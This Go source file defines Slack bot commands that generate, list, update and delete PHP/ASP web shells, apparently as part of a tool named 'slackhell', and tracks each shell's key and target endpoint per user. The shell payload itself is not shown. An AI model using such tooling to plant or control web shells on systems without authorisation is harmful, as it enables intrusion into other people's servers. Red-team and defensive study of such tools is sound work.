package bot

import (
	"errors"

	"github.com/asaskevich/govalidator"
	"github.com/herwonowr/slacker"
	"github.com/herwonowr/slackhell/internal/repository"
	"github.com/nlopes/slack"
)

func (s *botService) cmdGenerateShellcode() {
	cmd := &slacker.CommandDefinition{
		Description: "Generate shellcode",
		AuthorizationFunc: func(request slacker.Request) bool {
			return s.authorized(request.Event().User, false)
		},
		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
			agent := request.Event().User
			shellType := request.Param("type")
			if govalidator.IsNull(shellType) {
				s.sendError(errors.New("generate shellcode, format `generate <type>`"), request, response, true)
				return
			}

			if !(shellType == "php" || shellType == "asp") {
				s.sendError(errors.New("invalid shellcode type, valid type `php` and `asp`"), request, response, true)
				return
			}

			userInfo, err := s.slack.GetUserInfo(agent)
			if err != nil {
				s.sendError(errors.New("get user information"), request, response, true)
				return
			}

			randomKey, err := s.helper.GenerateRandomString(32)
			if err != nil {
				s.sendError(errors.New("generate shell key"), request, response, true)
				return
			}

			shellcode, err := s.helper.WriteShellcode(randomKey, shellType)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			s.mentionAgent(request, response)
			client := response.Client()
			file, err := client.UploadFile(slack.FileUploadParameters{
				Title:    "Name: " + randomKey + " Type: " + shellType,
				Filetype: shellType,
				Filename: randomKey + "." + shellType,
				Content:  string(shellcode),
				Channels: []string{agent},
			})
			if err != nil {
				s.sendError(errors.New("generate shell"), request, response, true)
				return
			}

			err = s.service.CreateShellcode(file.ID, shellType, randomKey, userInfo.ID, userInfo.RealName)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}
		},
	}

	s.slack.Command("generate <type>", cmd)
}

func (s *botService) cmdGetShellcodes() {
	cmd := &slacker.CommandDefinition{
		Description: "Get shellcodes",
		AuthorizationFunc: func(request slacker.Request) bool {
			return s.authorized(request.Event().User, false)
		},
		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
			agent := request.Event().User
			userInfo, err := s.slack.GetUserInfo(agent)
			if err != nil {
				s.sendError(errors.New("get user information"), request, response, true)
				return
			}

			shellcodes, err := s.service.GetShellcodes()
			if err != nil {
				s.sendError(errors.New("get authorized users"), request, response, true)
				return
			}

			isAdmin := false
			user, err := s.service.GetAccountBySlackID(userInfo.ID)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			if user.Role == repository.AdminRole {
				isAdmin = true
			}

			if len(shellcodes) == 0 {
				s.sendError(errors.New("shellcodes not availabe, please generate shellcode"), request, response, true)
				return
			}

			//TODO: add get shellcodes take and skip
			agentShellcodeCount := 0
			for _, shellcode := range shellcodes {
				if govalidator.IsNull(shellcode.Endpoint) {
					shellcode.Endpoint = "Inactive"
				}

				if !isAdmin {
					if shellcode.OwnerID != user.SlackID {
						continue
					}
					agentShellcodeCount++
				}

				shellcodeInfo := "```" + "File ID: " + shellcode.FileID + "\nKey: " + shellcode.ShellKey + "\nEndpoint: " + shellcode.Endpoint + "\nType: " + shellcode.Type + "\nOwner: @" + shellcode.OwnerRealName + "```"
				s.sendReply(shellcodeInfo, request, response, false)
			}

			if !isAdmin && agentShellcodeCount == 0 {
				s.sendError(errors.New("you don't have any shellcode, please generate shellcode"), request, response, true)
			}
		},
	}

	s.slack.Command("shellcodes", cmd)
}

func (s *botService) cmdUpdateShellcode() {
	cmd := &slacker.CommandDefinition{
		Description: "Update shellcode",
		AuthorizationFunc: func(request slacker.Request) bool {
			return s.authorized(request.Event().User, false)
		},
		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
			agent := request.Event().User
			endpoint := request.Param("endpoint")
			if govalidator.IsNull(endpoint) {
				s.sendError(errors.New("update shellcode, format `shellupdate <key> <endpoint>`"), request, response, true)
				return
			}
			key := request.Param("key")
			if govalidator.IsNull(key) {
				s.sendError(errors.New("update shellcode, format `shellupdate <key> <endpoint>`"), request, response, true)
				return
			}

			userInfo, err := s.slack.GetUserInfo(agent)
			if err != nil {
				s.sendError(errors.New("get user information"), request, response, true)
				return
			}

			shellcode, err := s.service.GetShellcodeByKey(key)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			user, err := s.service.GetAccountBySlackID(userInfo.ID)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			err = s.service.PutShellcode(shellcode.ShellKey, endpoint, user.SlackID)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			updateResponse := "Shellcode with key - `" + shellcode.ShellKey + "` has been successfully updated"
			s.sendReply(updateResponse, request, response, true)
		},
	}

	s.slack.Command("shellupdate <key> <endpoint>", cmd)
}

func (s *botService) cmdDeleteShellcode() {
	cmd := &slacker.CommandDefinition{
		Description: "Delete shellcode",
		AuthorizationFunc: func(request slacker.Request) bool {
			return s.authorized(request.Event().User, false)
		},
		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
			agent := request.Event().User
			shellcodeKey := request.Param("key")
			if govalidator.IsNull(shellcodeKey) {
				s.sendError(errors.New("delete shellcode, format `shelldel <key>`"), request, response, true)
				return
			}

			userInfo, err := s.slack.GetUserInfo(agent)
			if err != nil {
				s.sendError(errors.New("get user information"), request, response, true)
				return
			}

			shellcode, err := s.service.GetShellcodeByKey(shellcodeKey)
			if err != nil {
				s.sendError(err, request, response, true)
			}

			user, err := s.service.GetAccountBySlackID(userInfo.ID)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			if user.Role != repository.AdminRole && shellcode.OwnerID != user.SlackID {
				s.sendError(errors.New("you don't have permission to delete this shellcode"), request, response, true)
				return
			}

			client := response.Client()
			err = client.DeleteFile(shellcode.FileID)
			if err != nil {
				s.sendError(errors.New("cannot delete shellcode file, file already deleted or missing"), request, response, true)
			}

			err = s.service.DeleteShellcode(shellcode.ID)
			if err != nil {
				s.sendError(errors.New("delete shellcode"), request, response, true)
				return
			}

			deleteResponse := "Shellcode with key - `" + shellcode.ShellKey + "` has been successfully deleted"
			s.sendReply(deleteResponse, request, response, true)
		},
	}
	s.slack.Command("shelldel <key>", cmd)
}
